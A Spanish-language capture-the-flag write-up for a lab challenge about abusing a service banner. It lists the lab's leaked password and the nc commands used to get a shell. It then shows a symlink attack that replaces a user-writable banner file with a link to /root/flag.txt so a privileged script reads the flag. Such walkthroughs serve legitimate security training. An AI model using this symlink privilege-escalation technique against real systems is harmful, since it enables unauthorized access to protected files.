## Descripcion
Can you abuse the banner?
## Solucion

# Dont-You-Love-Banners

## 1. Consulta del banner

Primero se realizó una conexión al puerto `11441` para obtener la información expuesta por el servicio.

```bash
nc chatelaine.cylabacademy.net 11441
```

El servidor mostró información que incluía una contraseña:

```text
My_Passw@rd_@1234
```

Esta información será utilizada posteriormente para acceder al segundo servicio.

## 2. Conexión al servicio principal

Se realizó una conexión al puerto `36607`:

```bash
nc chatelaine.cylabacademy.net 36607
```

El servicio solicitó una contraseña, por lo que se utilizó la obtenida anteriormente:

```text
My_Passw@rd_@1234
```

Posteriormente se realizaron las preguntas de validación:

```text
DEFCON
```

y:

```text
John Draper
```

Después de responder correctamente se obtuvo acceso a una consola del servidor.

## 3. Análisis de los archivos

Una vez dentro del sistema se revisaron los archivos disponibles:

```bash
ls -la
```

Se identificó el archivo `banner`.

Posteriormente se revisó su contenido:

```bash
cat banner
```

También se inspeccionó el directorio `/root`:

```bash
cd /root
ls -la
```

Se encontró el archivo:

```text
flag.txt
```

Al intentar leerlo directamente:

```bash
cat flag.txt
```

se obtuvo un error de permisos, debido a que el usuario actual no tenía autorización para acceder directamente al archivo.

## 4. Análisis de `script.py`

Se revisó el archivo del script:

```bash
cat /root/script.py
```

Se observó que el programa utiliza el archivo:

```text
/home/player/banner
```

para mostrar información.

Esto permitió identificar una posible vulnerabilidad: si `banner` se convierte en un enlace simbólico que apunte a `/root/flag.txt`, el programa podría leer el contenido de la bandera utilizando sus propios privilegios.

## 5. Creación del enlace simbólico

Se regresó al directorio del usuario:

```bash
cd /home/player
```

Primero se conservó el banner original:

```bash
mv banner originalbanner
```

Después se creó un enlace simbólico llamado `banner` apuntando al archivo de la bandera:

```bash
ln -s /root/flag.txt banner
```

Se verificó el enlace mediante:

```bash
ls -l banner
```

El resultado debía mostrar algo similar a:

```text
banner -> /root/flag.txt
```

Esto confirmó que `banner` ahora apuntaba al archivo protegido.

## 6. Explotación

Se salió de la sesión:

```bash
exit
```

Después se volvió a acceder al servicio:

```bash
nc chatelaine.cylabacademy.net 36607
```

Al ejecutar nuevamente el programa, este intentó leer:

```text
/home/player/banner
```

Debido al enlace simbólico, realmente accedió a:

```text
/root/flag.txt
```

De esta manera fue posible obtener el contenido de la bandera sin leer directamente el archivo con el usuario `player`.

## 7. Conclusión

La vulnerabilidad del reto consiste en aprovechar un archivo controlado por el usuario que posteriormente es leído por un programa con privilegios elevados.

La explotación se realizó mediante un **enlace simbólico**, haciendo que:

```text
/home/player/banner
```

apuntara a:

```text
/root/flag.txt
```

Cuando el programa leyó `banner`, siguió el enlace simbólico y terminó leyendo el archivo de la bandera con sus privilegios.
## Notas adicionales

## Referencias
